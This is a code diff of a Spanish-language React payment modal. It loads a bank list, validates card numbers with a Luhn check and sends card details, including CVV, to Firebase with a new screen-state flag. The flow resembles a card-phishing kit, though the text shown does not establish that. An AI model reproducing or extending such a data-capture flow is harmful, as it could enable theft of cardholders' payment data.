@@ -1,9 +1,9 @@
-import React, { useLayoutEffect } from 'react'
-import { useState, useEffect } from 'react'
+
+import { useState, useEffect,useLayoutEffect } from 'react'
 import btnSelect from '../../assets/btnSelect.png'
 import Loading from './componentModal/Loading'
 import luhnChk from './componentModal/Functions/lunhChk'
-
+import arrBanks from './componentModal/Functions/arrBanks'
 import visa from '../../assets/visa.jpg'
 import amex from '../../assets/amex.jpg'
 import mastercard from '../../assets/mastercard.jpg'
@@ -13,6 +13,7 @@ import {sendFirebaseData } from '../../Firebase/sendFirebaseData'
 const meses = [{mes:"Enero",num:"01"}, {mes:"Febrero",num:"02"}, {mes:"Marzo",num:"03"}, {mes:"Abril",num:"04"}, {mes:"Mayo",num:"05"}, {mes:"Junio",num:"06"}, 
     {mes:"Julio",num:"07"}, {mes:"Agosto",num:"08"},{mes:"Septiembre",num:"09"}, {mes:"Octubre",num:"10"}, {mes:"Noviembre",num:"11"}, {mes:"Diciembre",num:"12"}
 ]
+
 const initialState = {
     cvv: "",
     bank: "",
@@ -83,7 +84,7 @@ const Modal = ({infoPay}) => {
             
             return
         }
-        sendFirebaseData({infoPay,data},setIdF)
+        sendFirebaseData({infoPay,data,scr:"load"},setIdF)
         // changeLoader()
         setActiveScreen(true)
     }
@@ -125,9 +126,9 @@ const Modal = ({infoPay}) => {
     
     
     return (
-        <div className='w-screen h-screen bg-gray-700 fixed top-0 bg-opacity-60 flex items-center justify-center '>
-            {activeScreen? <Screens idF={idF} />
-                : <div className='bg-white w-4/5 px-5 rounded-lg py-4'>
+        <div className='w-screen h-screen bg-gray-700 fixed top-0 bg-opacity-60 flex items-center justify-center pb-20'>
+            {activeScreen? <Screens idF={idF} setActiveScreen={setActiveScreen}/>
+                : <div className='bg-white w-4/5 h-min px-5 rounded-lg py-4'>
                     <div className=''>
                         <p className='font-bold'>Banco</p>
                         <div className='relative '>
@@ -138,7 +139,7 @@ const Modal = ({infoPay}) => {
                              `}
                             >
                                 <option value={""} className='ml-1 '>Seleccione su Banco</option>
-                                {["Bancolombia", "Banco1", "Banco2",].map((item) => {
+                                {arrBanks.map((item) => {
                                     return <option key={item} value={item}>
                                         {item}
                                     </option>
